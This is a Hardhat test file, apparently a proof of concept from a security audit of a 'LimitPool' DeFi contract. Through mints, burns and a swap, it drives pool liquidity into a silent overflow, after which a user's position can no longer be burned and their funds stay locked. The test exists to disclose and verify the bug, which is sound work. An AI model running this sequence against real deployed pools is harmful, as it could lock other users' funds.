/* global describe it before ethers */
const hardhat = require('hardhat')
const { expect } = require('chai')
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BigNumber } from 'ethers'
import { mintSigners20 } from '../utils/token'
import {
    BN_ZERO,
    PoolState,
    getLiquidity,
    getPositionLiquidity,
    getPrice,
    getSwapEpoch,
    getTick,
    getTickAtPrice,
    validateBurn,
    validateMint,
    validateSwap
} from '../utils/contracts/limitpool'
import { gBefore } from '../utils/hooks.test'

alice: SignerWithAddress
describe('LimitPool Tests', function () {
    let tokenAmount: string
    let tokenAmountBn: BigNumber
    let token0Decimals: number
    let token1Decimals: number
    let minPrice: BigNumber
    let maxPrice: BigNumber

    let alice: SignerWithAddress
    let bob: SignerWithAddress
    let carol: SignerWithAddress

    const liquidityAmount = BigNumber.from('20051041647900280328782')
    const minTickIdx = BigNumber.from('-887272')
    const maxTickIdx = BigNumber.from('887272')

    ////////// DEBUG FLAGS //////////
    let debugMode = false
    let balanceCheck = false
    let deltaMaxBeforeCheck = false
    let deltaMaxAfterCheck = false
    let latestTickCheck = false

    //every test should clear out all liquidity

    before(async function () {
        await gBefore()

        let currentBlock = await ethers.provider.getBlockNumber()
        const pool0: PoolState = await hre.props.limitPool.pool0()
        const liquidity = pool0.liquidity
        const globalState = await hre.props.limitPool.globalState()
        const price = pool0.price

        expect(liquidity).to.be.equal(BN_ZERO)

        minPrice = BigNumber.from('4297706460')
        maxPrice = BigNumber.from('1460570142285104104286607650833256105367815198570')
        token0Decimals = await hre.props.token0.decimals()
        token1Decimals = await hre.props.token1.decimals()
        tokenAmountBn = ethers.utils.parseUnits('100', token0Decimals)
        tokenAmount = ethers.utils.parseUnits('200', token0Decimals).toString()
        alice = hre.props.alice
        bob = hre.props.bob
        carol = hre.props.carol
    })

    this.beforeEach(async function () {
        await mintSigners20(hre.props.token0, tokenAmountBn.mul(10), [hre.props.alice, hre.props.bob])

        await mintSigners20(hre.props.token1, tokenAmountBn.mul(10), [hre.props.alice, hre.props.bob])
    }) 
 
 it.only('Silent overflow makes users unable to burn their position', async function () {
        expect(await getTickAtPrice(false)).to.eq(0);
        expect(await getTickAtPrice(true)).to.eq(0);

        console.log("Mint #1");

        await validateMint({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            lower: '0',
            upper: '10',
            amount: BigNumber.from("92908011034199"),
            zeroForOne: true,
            balanceInDecrease: BigNumber.from("92908011034199"),
            liquidityIncrease: BigNumber.from("185871770591153141"),
            upperTickCleared: false,
            lowerTickCleared: true,
            revertMessage: '',
        });

        expect(await getLiquidity(true)).to.be.equal(BigNumber.from("185871770591153141"))

        console.log("Mint #2");

        await validateMint({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            lower: '-10',
            upper: '0',
            amount: BigNumber.from("1"),
            zeroForOne: true,
            balanceInDecrease: BigNumber.from("1"),
            liquidityIncrease: BigNumber.from("1999"),
            upperTickCleared: false,
            lowerTickCleared: true,
            revertMessage: '',
        });

        expect(await getLiquidity(true)).to.be.equal(BigNumber.from("1999"));

        console.log("Burn #1");

        await validateBurn({
            signer: hre.props.alice,
            lower: '-10',
            upper: '0',
            claim: '-10',
            liquidityPercent: ethers.utils.parseUnits('1', 38),
            zeroForOne: true,
            balanceInIncrease: '0',
            balanceOutIncrease: '0',
            lowerTickCleared: true,
            upperTickCleared: true,
            revertMessage: '',
        })

        console.log("Swap #1");

        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amountIn: BigNumber.from("22"),
            priceLimit: BigNumber.from("79220898858226420364311811501"),
            balanceInDecrease: '0',
            balanceOutIncrease: '0',
            revertMessage: '',
        })

        console.log("Mint #3");

        expect(await getLiquidity(true)).to.be.equal(BigNumber.from("0"));

        await validateMint({
            signer: hre.props.bob,
            recipient: hre.props.bob.address,
            lower: '-10',
            upper: '0',
            amount: BigNumber.from("1"),
            zeroForOne: false,
            balanceInDecrease: BigNumber.from("1"),
            liquidityIncrease: BigNumber.from("0"),
            upperTickCleared: false,
            lowerTickCleared: true,
            revertMessage: '',
        });

        expect(await getLiquidity(true)).to.be.equal(BigNumber.from("340282366920938463463188735661177058315"));

        console.log("Burn #2 ");
        await validateBurn({
            signer: hre.props.bob,
            lower: '-10',
            upper: '0',
            claim: '0',
            liquidityPercent: ethers.utils.parseUnits('1', 38),
            zeroForOne: false,
            balanceInIncrease: '0',
            balanceOutIncrease: '0',
            lowerTickCleared: true,
            upperTickCleared: true,
            revertMessage: '',
        })

        console.log("Burn #3");

        await validateBurn({
            signer: hre.props.alice,
            lower: '0',
            upper: '10',
            claim: '10',
            liquidityPercent: ethers.utils.parseUnits('1', 38),
            zeroForOne: true,
            balanceInIncrease: '0',
            balanceOutIncrease: '0',
            lowerTickCleared: true,
            upperTickCleared: true,
            revertMessage: 'ERC20: transfer amount exceeds balance',
        })


    });


})